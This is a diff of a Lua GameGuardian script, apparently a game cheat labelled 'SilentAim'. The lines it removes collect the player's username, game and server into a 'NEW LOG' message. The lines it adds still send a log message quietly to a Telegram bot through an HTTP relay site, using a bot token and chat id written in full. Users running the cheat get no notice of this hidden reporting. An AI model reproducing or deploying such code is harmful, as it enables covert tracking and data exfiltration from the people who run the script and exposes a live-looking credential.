@@ -4,20 +4,16 @@ SAMPMENU = 1
 
 
 gg.toast("Please wait ⏳")
-gtname()
-
-teltxtzz = '💥 NEW LOG 💥\n🟢 username = '.. username .. '\n🟢 ' .. nmegame .. " \n🟢 Server = " .. srvr.. "\n🟢 info = Use SilentAim Script"
-
-local payloadz =
-'{"UrlBox":"https://api.telegram.org/bot6743962096:AAEICTpv7Sa18CZerP0zX80tGvsh1H7Pdkw/sendMessage?chat_id=6494260043&text=' .. teltxtzz ..'","AgentList":"Internet Explorer","VersionsList":"HTTP/1.1","MethodList":"POST"}'
-recxx = gg.makeRequest("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",
-{
-["Authorization"] = "Maybe you need an Authorization header?",
-["Content-Type"] = "application/json",
-["Content-Length"] = payloadz:len()
+recxx = gg.makeRequest("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",{
+['Authorization'] = 'Maybe you need an Authorization header?',
+['Content-Length'] = 311,
+['Content-Type'] = 'application/json',
 },
-payloadz
-)
+([["{\"UrlBox\":\"https://api.telegram.org/bot6743962096:AAEICTpv7Sa18CZerP0zX80tGvsh1H7Pdkw/sendMessage?chat_id=6494260043&text=💥 NEW LOG 💥
+🟢 username =
+🟢 NoName =
+🟢 Server = NoServer
+🟢 info = Use SilentAim Script\",\"AgentList\":\"Internet Explorer\",\"VersionsList\":\"HTTP/1.1\",\"MethodList\":\"POST\"}"]]))
 
 gg.setVisible(true)
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
